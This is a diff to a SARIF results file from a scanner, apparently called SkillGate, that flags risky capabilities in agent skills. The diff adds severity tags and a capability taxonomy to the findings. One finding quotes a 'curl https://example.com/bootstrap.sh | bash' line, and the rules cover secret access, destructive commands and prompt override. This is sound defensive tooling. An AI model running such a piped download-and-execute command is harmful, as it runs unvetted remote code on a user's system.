@@ -20,7 +20,24 @@
           "message": {
             "text": "Shell execution detected: #!/usr/bin/env bash"
           },
-          "ruleId": "SG001"
+          "properties": {
+            "capability": "shell_execution",
+            "severity": "medium",
+            "tags": [
+              "skillgate",
+              "capability:shell_execution",
+              "severity:medium"
+            ]
+          },
+          "ruleId": "SG001",
+          "taxa": [
+            {
+              "id": "shell_execution",
+              "toolComponent": {
+                "name": "SkillGate capabilities"
+              }
+            }
+          ]
         },
         {
           "level": "error",
@@ -39,7 +56,24 @@
           "message": {
             "text": "Shell execution detected: curl https://example.com/bootstrap.sh | bash"
           },
-          "ruleId": "SG001"
+          "properties": {
+            "capability": "shell_execution",
+            "severity": "high",
+            "tags": [
+              "skillgate",
+              "capability:shell_execution",
+              "severity:high"
+            ]
+          },
+          "ruleId": "SG001",
+          "taxa": [
+            {
+              "id": "shell_execution",
+              "toolComponent": {
+                "name": "SkillGate capabilities"
+              }
+            }
+          ]
         },
         {
           "level": "warning",
@@ -58,7 +92,24 @@
           "message": {
             "text": "Network egress detected: Host: example.com"
           },
-          "ruleId": "SG003"
+          "properties": {
+            "capability": "network_egress",
+            "severity": "medium",
+            "tags": [
+              "skillgate",
+              "capability:network_egress",
+              "severity:medium"
+            ]
+          },
+          "ruleId": "SG003",
+          "taxa": [
+            {
+              "id": "network_egress",
+              "toolComponent": {
+                "name": "SkillGate capabilities"
+              }
+            }
+          ]
         },
         {
           "level": "error",
@@ -77,7 +128,95 @@
           "message": {
             "text": "Remote download followed by execution: curl https://example.com/bootstrap.sh | bash"
           },
-          "ruleId": "SG004"
+          "properties": {
+            "capability": "remote_download_execution",
+            "severity": "high",
+            "tags": [
+              "skillgate",
+              "capability:remote_download_execution",
+              "severity:high"
+            ]
+          },
+          "ruleId": "SG004",
+          "taxa": [
+            {
+              "id": "remote_download_execution",
+              "toolComponent": {
+                "name": "SkillGate capabilities"
+              }
+            }
+          ]
+        }
+      ],
+      "taxonomies": [
+        {
+          "name": "SkillGate capabilities",
+          "organization": "OpenEvalGate",
+          "taxa": [
+            {
+              "id": "destructive_action",
+              "name": "destructive_action",
+              "shortDescription": {
+                "text": "SkillGate capability: destructive_action"
+              }
+            },
+            {
+              "id": "filesystem_write",
+              "name": "filesystem_write",
+              "shortDescription": {
+                "text": "SkillGate capability: filesystem_write"
+              }
+            },
+            {
+              "id": "mcp_server",
+              "name": "mcp_server",
+              "shortDescription": {
+                "text": "SkillGate capability: mcp_server"
+              }
+            },
+            {
+              "id": "network_egress",
+              "name": "network_egress",
+              "shortDescription": {
+                "text": "SkillGate capability: network_egress"
+              }
+            },
+            {
+              "id": "obfuscation",
+              "name": "obfuscation",
+              "shortDescription": {
+                "text": "SkillGate capability: obfuscation"
+              }
+            },
+            {
+              "id": "prompt_override",
+              "name": "prompt_override",
+              "shortDescription": {
+                "text": "SkillGate capability: prompt_override"
+              }
+            },
+            {
+              "id": "remote_download_execution",
+              "name": "remote_download_execution",
+              "shortDescription": {
+                "text": "SkillGate capability: remote_download_execution"
+              }
+            },
+            {
+              "id": "secret_access",
+              "name": "secret_access",
+              "shortDescription": {
+                "text": "SkillGate capability: secret_access"
+              }
+            },
+            {
+              "id": "shell_execution",
+              "name": "shell_execution",
+              "shortDescription": {
+                "text": "SkillGate capability: shell_execution"
+              }
+            }
+          ]
         }
       ],
       "tool": {
@@ -91,6 +230,13 @@
               },
               "id": "SG001",
               "name": "SG001",
+              "properties": {
+                "tags": [
+                  "skillgate",
+                  "capability:shell_execution",
+                  "severity:medium"
+                ]
+              },
               "shortDescription": {
                 "text": "Shell execution detected"
               }
@@ -101,6 +247,13 @@
               },
               "id": "SG002",
               "name": "SG002",
+              "properties": {
+                "tags": [
+                  "skillgate",
+                  "capability:destructive_action",
+                  "severity:high"
+                ]
+              },
               "shortDescription": {
                 "text": "Destructive command detected"
               }
@@ -111,6 +264,13 @@
               },
               "id": "SG003",
               "name": "SG003",
+              "properties": {
+                "tags": [
+                  "skillgate",
+                  "capability:network_egress",
+                  "severity:medium"
+                ]
+              },
               "shortDescription": {
                 "text": "Network egress detected"
               }
@@ -121,6 +281,13 @@
               },
               "id": "SG004",
               "name": "SG004",
+              "properties": {
+                "tags": [
+                  "skillgate",
+                  "capability:remote_download_execution",
+                  "severity:high"
+                ]
+              },
               "shortDescription": {
                 "text": "Remote download followed by execution"
               }
@@ -131,6 +298,13 @@
               },
               "id": "SG005",
               "name": "SG005",
+              "properties": {
+                "tags": [
+                  "skillgate",
+                  "capability:secret_access",
+                  "severity:high"
+                ]
+              },
               "shortDescription": {
                 "text": "Secret or credential access detected"
               }
@@ -141,6 +315,13 @@
               },
               "id": "SG006",
               "name": "SG006",
+              "properties": {
+                "tags": [
+                  "skillgate",
+                  "capability:filesystem_write",
+                  "severity:medium"
+                ]
+              },
               "shortDescription": {
                 "text": "Filesystem write capability detected"
               }
@@ -151,6 +332,13 @@
               },
               "id": "SG007",
               "name": "SG007",
+              "properties": {
+                "tags": [
+                  "skillgate",
+                  "capability:prompt_override",
+                  "severity:high"
+                ]
+              },
               "shortDescription": {
                 "text": "Prompt override language detected"
               }
@@ -161,6 +349,13 @@
               },
               "id": "SG008",
               "name": "SG008",
+              "properties": {
+                "tags": [
+                  "skillgate",
+                  "capability:obfuscation",
+                  "severity:medium"
+                ]
+              },
               "shortDescription": {
                 "text": "Suspicious Unicode or obfuscation detected"
               }
@@ -171,6 +366,13 @@
               },
               "id": "SG009",
               "name": "SG009",
+              "properties": {
+                "tags": [
+                  "skillgate",
+                  "capability:mcp_server",
+                  "severity:informational"
+                ]
+              },
               "shortDescription": {
                 "text": "MCP server configuration discovered"
               }
